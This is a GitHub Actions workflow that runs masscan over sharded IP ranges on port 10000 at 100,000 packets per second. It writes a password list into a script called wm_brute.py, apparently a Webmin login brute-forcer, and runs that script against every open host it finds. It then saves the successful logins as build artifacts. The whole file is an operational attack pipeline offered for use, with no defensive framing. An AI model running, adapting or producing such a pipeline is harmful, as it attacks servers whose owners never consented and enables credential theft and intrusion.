name: redo
on: workflow_dispatch
jobs:
  a:
    runs-on: ubuntu-latest
    timeout-minutes: 350
    strategy:
      fail-fast: false
      matrix:
        shard: [1, 7]
    steps:
      - uses: actions/checkout@v4
      - run: sudo apt-get update -qq && sudo apt-get install -y -qq masscan && pip install -q requests
      - run: |
          python3 - <<'PY'
          import re
          src = open('wm_brute.py').read()
          pl = open('pwlist2.txt').read().split()
          src = re.sub(r"PASSWORDS = \[[^\]]*\]", "PASSWORDS = " + repr(pl), src, flags=re.S)
          open('wm_brute.py','w').write(src)
          PY
      - run: |
          : > s_all.txt
          for r in $(cat r8_${{ matrix.shard }}.txt); do
            sudo masscan $r -p10000 --rate 100000 -oL s1.txt --wait 0 >/dev/null 2>&1 || true
            cat s1.txt >> s_all.txt 2>/dev/null || true
          done
          awk '$1=="open"{print $4":"$3}' s_all.txt | sort -u > shard_hosts.txt
          echo "=== shard ${{ matrix.shard }} hosts: $(wc -l < shard_hosts.txt) ==="
          python3 wm_brute.py shard_hosts.txt || true
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: redo-${{ matrix.shard }}
          path: /tmp/wm_brute_hits.json
          if-no-files-found: warn
